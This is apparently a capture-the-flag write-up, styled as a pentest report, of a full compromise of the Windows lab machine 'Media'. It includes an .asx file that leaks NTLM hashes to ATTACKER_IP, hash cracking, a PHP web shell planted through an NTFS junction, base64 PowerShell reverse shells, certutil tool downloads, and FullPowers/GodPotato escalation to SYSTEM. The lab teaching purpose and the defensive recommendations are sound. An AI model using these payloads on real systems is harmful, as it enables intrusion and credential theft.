+++
title = "Media-CPTS-Prep-Box-Writeup.md"
date = 2026-02-19T00:00:00Z
draft = false
description = "Media is a medium-difficulty Windows machine featuring NTLM hash leakage via Windows Media Player files, NTFS junction attacks for RCE, and privilege escalation through SeTcbPrivilege abuse with FullPowers and GodPotato"
tags = ["CPTS", "HTB", "Media", "CPTS Prep", "Windows", "NTLM", "Junction", "SeTcbPrivilege", "GodPotato"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows host "Media" (`10.129.190.66`). The objective was to evaluate the security posture of the target and identify potential escalation paths to achieve SYSTEM-level privileges.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to full system compromise. The following key findings were identified:

- **NTLM Hash Leakage via Windows Media Player Files:** The web application allowed upload of Windows Media Player compatible files (.asx/.wax). A malicious file was crafted to force SMB authentication back to the attacker, capturing the NTLMv2 hash for the user `enox`.

- **Credential Cracking:** The captured NTLMv2 hash was successfully cracked, revealing the password `1234virus@` and enabling SSH access to the target.

- **Source Code Analysis:** Examination of the web application's source code revealed the upload directory structure and file naming convention, exposing a path for exploitation.

- **NTFS Junction Attack:** The predictable upload directory structure was abused by deleting the target folder and creating a junction (directory symlink) pointing to the webroot. This allowed uploading a PHP web shell directly to the web application directory.

- **Remote Code Execution as Local Service:** The uploaded web shell provided execution under the `NT AUTHORITY\LOCAL SERVICE` account, which possessed the `SeTcbPrivilege` (Act as part of the operating system).

- **Privilege Escalation to SYSTEM:** Using FullPowers to restore disabled privileges and GodPotato to leverage SeImpersonatePrivilege, a reverse shell as `NT AUTHORITY\SYSTEM` was obtained.

**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to achieve SYSTEM-level privileges by chaining together NTLM hash leakage, file upload vulnerabilities, NTFS junction abuse, and Windows privilege escalation techniques.

**Recommendations:**

- **Secure File Uploads:** Implement strict validation of uploaded files, including content verification and safe storage outside the webroot.
- **Disable SMB Authentication:** Block outbound SMB traffic (port 445) to prevent NTLM hash leakage through file inclusion attacks.
- **Remove SeTcbPrivilege:** Service accounts should not possess high-privilege capabilities like `SeTcbPrivilege`. Review and restrict privilege assignments.
- **Patch and Update:** Apply security updates for Windows privilege escalation vulnerabilities exploited by tools like GodPotato.
- **Use Strong Passwords:** Ensure all user accounts use complex passwords that resist cracking attempts.

## About

Media is a Medium difficulty machine that features an Apache XAMPP stack on Windows hosting a custom PHP web application. The web application allows the upload of a Windows Media Player compatible file that can be leveraged to leak the NTLMv2 hash of the user account that opens it. This hash can be cracked to obtain user credentials that can be used to authenticate to the target via SSH. Upon gaining initial access the source code of the application can be analyzed to determine the generated storage path of uploaded files on the web application which can lead to an NTFS Junction (directory symbolic link) attack to upload a malicious PHP web shell for RCE. Once a shell under the context of the web server's service account, players can abuse the `SeTcbPrivilege - Act as part of the operating system`, a Windows privilege that lets code impersonate any user and achieve administrative privileges. Alternative methods for privilege escalation involve regaining the `SeImpersonate` privilege to elevate to `NT Authority\SYSTEM`.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash
nmap -p- -vvv --min-rate 10000 10.129.190.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 15:06 UTC
...[snip]...
Nmap scan report for 10.129.190.66
Host is up, received echo-reply ttl 127 (0.023s latency).
Scanned at 2025-09-04 15:06:22 UTC for 13s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 127
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 14 (600B)

 nmap -p 22,80,3389 -sCV 10.129.190.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 15:06 UTC
Nmap scan report for 10.129.190.66
Host is up (0.022s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2025-04-15T03:36:52
|_Not valid after:  2025-10-15T03:36:52
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-04T15:07:07+00:00
|_ssl-date: 2025-09-04T15:07:12+00:00; +2s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```
**Findings:** The scan revealed three open ports: SSH (22/tcp), HTTP (80/tcp) running Apache with PHP 8.1.17, and RDP (3389/tcp). The host was identified as a Windows system named `MEDIA` running XAMPP stack.


**2. Web Application Enumeration**  
The website presented a business site for "ProMotion Studio" with a form at the bottom for uploading files compatible with Windows Media Player.

**Findings:** The file upload functionality accepted various file types, with the application indicating they should be Windows Media Player compatible.

### Phase 2: NTLM Hash Leakage

**3. Malicious Media File Creation**  
A Windows Media Player metafile (.asx) was crafted to force SMB authentication back to the attacker's machine. The file contains a reference to a remote SMB share controlled by the attacker.

`Payload  ntlm.asx or .wax`
```
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```


**4. Responder Setup**  
Responder was started on the attacking interface to capture any incoming NTLM authentication attempts.
```bash

❯ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [OFF]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.25]
    Responder IPv6             [dead:beef:4::1017]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-HGNQ5XHNI6Y]
    Responder Domain Name      [IK1D.LOCAL]
    Responder DCE-RPC Port     [48746]

[+] Listening for events...


[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6c351e00014b89c1:D54580076C88702F6CEB3C252D2560FF:01010000000000<REDACTED> 6900660073002F00310030002E00310030002E00310036002E00320035000000000000000000
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox


```

**5. Payload Upload**  
The malicious `.asx` file was uploaded through the web application's form along with dummy personal information (firstname, lastname, email).

**Findings:** Shortly after upload, Responder captured an NTLMv2 hash for the user `enox` from the target machine (`MEDIA\enox`).

**6. Hash Cracking**  
The captured NTLMv2 hash was cracked using hashcat with the rockyou wordlist.

```bash 

❯ hashcat enox_ntlmvs.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 7435HS, 6851/13767 MB (2048 MB allocatable), 16MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENOX::MEDIA:6c351e00014b89c1:d54580076c88702f6ceb3c252d2560ff:01010000000000<REDACTED> 900660073002f00310030002e00310030002e00310036002e00320035000000000000000000:<REDACTED> 

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::MEDIA:6c351e00014b89c1:d54580076c88702f6ceb3c...000000
Time.Started.....: Fri Nov 21 13:17:01 2025 (2 secs)
Time.Estimated...: Fri Nov 21 13:17:03 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6652.7 kH/s (1.57ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13352960/14344385 (93.09%)
Rejected.........: 0/13352960 (0.00%)
Restore.Point....: 13336576/14344385 (92.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 12359331 -> 123-amo
Hardware.Mon.#1..: Temp: 76c Util: 64%

Started: Fri Nov 21 13:17:00 2025
Stopped: Fri Nov 21 13:17:05 2025

 /home/honeypoop/HTB/CPTS-Prep/Media/03-Attack-Chains   
```
**Findings:** The password for `enox` was successfully cracked: `<REDACTED>`.

### Phase 3: Initial Access via SSH

**7. SSH Access**  
The cracked credentials were used to establish an SSH session as the user `enox`.
```bash
❯ ssh enox@10.129.234.67
The authenticity of host '10.129.234.67 (10.129.234.67)' can't be established.
ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.67' (ED25519) to the list of known hosts.
enox@10.129.234.67's password:
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>

```

**8. Initial Enumeration**  
Basic system enumeration was performed to understand the environment.
```bash
ssh enox@10.129.234.67 
password: 1234virus@

PS C:\xampp> systeminfo
ERROR: Access denied
PS C:\xampp>
PS C:\xampp> whoami
media\enox
PS C:\xampp> tasklist
ERROR: Access denied
PS C:\xampp> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : MEDIA
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-11-75
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::3cde:cbdc:186e:7fae(Preferred)
   Link-local IPv6 Address . . . . . : fe80::1e5:7c57:7358:95a%3(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.234.67(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, November 20, 2025 9:51:10 PM
   Lease Expires . . . . . . . . . . : Thursday, November 20, 2025 11:21:11 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%3
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 134238294
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-30-3F-C9-A6-0A-13-A8-05-7B-75
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
PS C:\xampp>

```
**Findings:** The user `enox` had limited privileges. The system was running XAMPP in `C:\xampp`.


**9. XAMPP Password Discovery**  
The XAMPP installation contained a `passwords.txt` file with default credentials for various services.
```powershell

PS C:\xampp> cat .\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury (not in the USB & lite version):

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so

   Please do not forget to refresh the WEBDAV authentification (users and passwords).
PS C:\xampp>

```
**Findings:** The file revealed default credentials including WEBDAV credentials (`xampp-dav-unsecure:ppmax2011`), though WEBDAV was not active.

### Phase 4: Source Code Analysis

**10. Web Application Source Code Review**  
The PHP source code for the upload functionality was examined to understand the upload mechanism.
```bash 

PS C:\xampp\htdocs> cat .\index.php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);


        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>
<!DOCTYPE html>

```
**Findings:** The source code revealed critical information:

- Upload directory: `C:/Windows/Tasks/Uploads/`
    
- Folder naming convention: `md5(firstname + lastname + email)`
    
- Directory permissions: Created with `0777` (full read/write)
    
- Filename sanitization: `preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename)`
    
- PHP files are allowed (`.php` passes the regex)
    

**11. Upload Directory Investigation**  
The actual upload directory was examined to confirm the structure.

```bash
PS C:\windows\Tasks> cd Uploads
PS C:\windows\Tasks\Uploads> ls


    Directory: C:\windows\Tasks\Uploads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/20/2025  10:15 PM                d41d8cd98f00b204e9800998ecf8427e
-a----        11/20/2025  10:16 PM              0 todo.txt


PS C:\windows\Tasks\Uploads> cat .\todo.txt
PS C:\windows\Tasks\Uploads> cd .\d41d8cd98f00b204e9800998ecf8427e\
PS C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e> ls


    Directory: C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/20/2025  10:15 PM            147 ntlm.asx
-a----        11/20/2025  10:14 PM            147 track.mp4


PS C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e> cd ../
PS C:\windows\Tasks\Uploads>

```
**Findings:** A folder with the MD5 hash of the submitted information existed, containing the uploaded `.asx` file. The `todo.txt` file tracked uploads.

### Phase 5: NTFS Junction Attack

**12. Understanding the Attack Vector**  
The application creates folders with `0777` permissions, allowing deletion and recreation by the `enox` user. A junction (directory symbolic link) could redirect the upload path to the webroot.

**13. Simple PHP Web Shell Creation**  
A minimal PHP web shell was created for command execution.
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

**14. Upload Directory Removal**  
The existing upload folder was removed to prepare for the junction.
```powershell
PS C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e> ls 

Directory: C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e 
Mode LastWriteTime Length 
Name ---- ------------- ------ ---- -a---- 11/20/2025 10:15 PM 147 ntlm.asx -a---- 11/20/2025 10:52 PM 5493 phpreverseshell.php -a---- 11/20/2025 10:14 PM 147 track.mp4 PS C:\windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e>


PS C:\windows\Tasks\Uploads> rmdir C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e

Confirm
The item at C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e
has children and the Recurse parameter was not specified. If you
continue, all children will be removed with the item. Are you sure you
want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help
(default is "Y"):Y

```

**15. Junction Creation**  
A junction was created pointing from the expected upload path to the webroot.
```powershell
enox@MEDIA C:\Users\enox\Desktop>mklink /J C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e C:\xampp\htdocs\
Junction created for C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e <<===>> C:\xampp\htdocs\

enox@MEDIA C:\Users\enox\Desktop>

```

**16. Web Shell Upload**  
The PHP web shell was uploaded through the web application form. Due to the junction, it was written directly to `C:\xampp\htdocs\`.

**Findings:** The web shell appeared in the webroot and was accessible via the browser.

```bash
    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----        11/20/2025  10:58 PM           5493 phpreverseshell.php


PS C:\xampp\htdocs>

```

### Phase 6: Remote Code Execution

**17. Web Shell Access**  
The uploaded web shell was accessed to execute commands.
```bash
curl "http://10.129.234.67/php-shell.php?cmd=whoami"
```


**18. Reverse Shell as Local Service**  
A PowerShell reverse shell was executed through the web shell to obtain an interactive session.

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4A <REDACTED> BlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

**19. Shell as Local Service**  
The reverse shell connected back, providing access as `NT AUTHORITY\LOCAL SERVICE`.
```bash 
❯ rlwrap -cAr nc -lvnp  9001
Listening on 0.0.0.0 9001
Connection received on 10.129.234.67 54798

PS C:\xampp\htdocs> whoami
nt authority\local service
PS C:\xampp\htdocs>

```

**20. Privilege Enumeration**  
The privileges of the current user were examined.
```bash 

PS C:\Windows> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
PS C:\Windows>

```

**Findings:** The `LOCAL SERVICE` account possessed `SeTcbPrivilege` (Act as part of the operating system), a high-value privilege for escalation.
### Phase 7: Privilege Escalation to SYSTEM

**21. Tool Transfer**  
Privilege escalation tools were downloaded to the target.
```powershell
certutil -urlcache -split -f http://10.10.16.25/FullPowers.exe
certutil -urlcache -split -f http://10.10.16.25/GodPotato-NET4.exe
```


**22. Restoring Privileges with FullPowers**  
FullPowers was used to restore disabled privileges and obtain a token with `SeImpersonatePrivilege`.
```bash 
.\FullPowers.exe -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
<REDACTED> dABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

**23. Privilege Verification**  
The new session was checked for available privileges.
```bash 
❯ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.67 54807

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
PS C:\Windows\system32> cd c:\programdata
PS C:\programdata> ls


    Directory: C:\programdata


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/10/2023   6:41 AM                Amazon
d---s-         10/1/2023  11:45 PM                Microsoft
d-----         4/15/2025   9:08 PM                Package Cache
d-----         8/26/2025  12:58 PM                Packages
d-----        10/10/2023   3:55 AM                regid.1991-06.com.microsoft
d-----          5/8/2021   1:20 AM                SoftwareDistribution
d-----         8/27/2025   7:04 AM                ssh
d-----         10/2/2023  10:33 AM                USOPrivate
d-----          5/8/2021   1:20 AM                USOShared
d-----         10/2/2023  12:18 AM                VMware
-a----        11/20/2025  11:31 PM          36864 FullPowers.exe
-a----        11/20/2025  11:31 PM          57344 GodPotato-NET4.exe


PS C:\programdata>

```
**Findings:** The new session had `SeImpersonatePrivilege` enabled, suitable for potato-style privilege escalation.


**24. SYSTEM Shell with GodPotato**  
GodPotato was used to execute a reverse shell as `NT AUTHORITY\SYSTEM`.
```bash 
.\GodPotato-NET4.exe -cmd 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
<REDACTED> eQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

**25. SYSTEM Shell Acquisition**  
The reverse shell connected back as `NT AUTHORITY\SYSTEM`, providing complete control over the target.
```bash
rlwrap -cAr nc -lvnp 9001
```

### Phase 8: Flag Retrieval

**26. Root Flag**  
With SYSTEM access achieved, the root flag was retrieved from the Administrator's desktop.

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```
## Key Takeaways

- **Windows Media Player File Attacks:** Custom media files (.asx/.wax) can force SMB authentication, leading to NTLM hash leakage when opened.
    
- **Predictable Paths:** Application-generated paths based on known input can be abused for junction attacks.
    
- **NTFS Junctions:** Directory junctions allow redirection of file writes, enabling attackers to place files in arbitrary locations.
    
- **SeTcbPrivilege:** This powerful privilege ("Act as part of the operating system") can be abused for privilege escalation.
    
- **FullPowers Tool:** This utility can restore disabled privileges on service accounts, enabling further escalation techniques.
    
- **GodPotato:** Modern potato-style attacks can leverage SeImpersonatePrivilege for SYSTEM-level access.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
